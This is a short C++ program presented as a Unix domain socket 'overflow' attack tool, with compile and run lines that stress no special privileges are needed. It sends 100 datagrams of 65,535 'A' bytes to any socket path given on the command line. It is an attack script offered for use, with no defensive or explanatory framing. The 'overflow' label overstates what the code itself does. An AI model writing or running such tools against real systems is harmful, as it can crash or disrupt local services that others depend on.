// Compile: g++ -o unix_overflow unix_overflow.cpp
// Run: ./unix_overflow <socket_path>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

class UnixOverflow {
public:
    void overflow(const std::string& socketPath) {
        int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (sock < 0) { perror("socket"); return; }
        
        struct sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, socketPath.c_str(), sizeof(addr.sun_path) - 1);
        
        char payload[65535];
        memset(payload, 'A', sizeof(payload));
        
        for (int i = 0; i < 100; i++) {
            sendto(sock, payload, sizeof(payload), 0, 
                   (struct sockaddr*)&addr, sizeof(addr));
        }
        
        close(sock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 2) { std::cerr << "Usage: " << argv[0] << " <socket>\n"; return 1; }
    UnixOverflow overflow;
    overflow.overflow(argv[1]);
    return 0;
}